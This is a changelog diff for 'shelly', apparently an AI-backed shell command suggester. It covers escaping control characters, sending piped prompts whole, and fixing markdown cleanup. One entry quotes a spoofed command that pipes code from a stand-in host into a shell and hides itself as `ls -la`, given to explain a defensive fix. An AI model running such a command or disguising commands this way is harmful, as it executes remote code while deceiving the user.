@@ -21,6 +21,19 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **`--info` shows the real Anthropic token budget.** It printed 500 for
   every model, while the newer models are sent 2048. It now prints the
   budget actually sent, plus a `temperature` row saying whether one is sent.
+- **What you see is what runs.** A reply carrying a carriage return or an
+  escape sequence could hide part of a command on screen, e.g.
+  `curl evil.example | sh #\r<ESC>[2Kls -la` displayed as just `ls -la`.
+  Control characters other than newline and tab are now shown escaped
+  (`\r`, `\x1b`) in suggestions, explanations and error messages. Executing,
+  editing and copying still use the exact text, as does captured output
+  (`$(shelly ...)`).
+- **Piped prompts are sent whole.** `printf 'find big files\nin my home
+  dir\n' | shelly` sent only the first line; it now sends every line.
+- **Markdown cleanup no longer mangles some commands.** A csh command such
+  as `` `which a` b `which c` `` lost its outer backticks, and a fenced
+  block followed by prose kept the closing fence and the prose in the
+  command.
 
 ## [1.8.1]
 
